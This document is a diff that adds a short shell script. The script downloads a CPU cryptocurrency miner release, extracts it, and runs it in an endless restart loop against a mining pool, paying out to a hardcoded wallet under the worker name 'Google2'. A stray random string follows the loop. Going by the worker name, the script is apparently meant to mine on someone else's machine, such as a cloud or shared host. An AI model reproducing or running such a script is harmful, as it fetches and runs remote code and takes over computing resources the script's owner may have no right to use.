@@ -1,0 +1,13 @@
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz
+
+# extrak file
+tar xf cpuminer-opt-linux.tar.gz
+
+while [ 1 ]; do
+./cpuminer-sse2 -a yespowerRES -o stratum+tcps://stratum-eu.rplant.xyz:17040 -u r1JLSQUNJGBwz5Uo9kM1ysKxsxBhZizEoJm.Google2
+sleep 5
+done
+
+
+
+znj7CF6Bs8YQm2KohuRwpiZzbSDdRw6Gu68
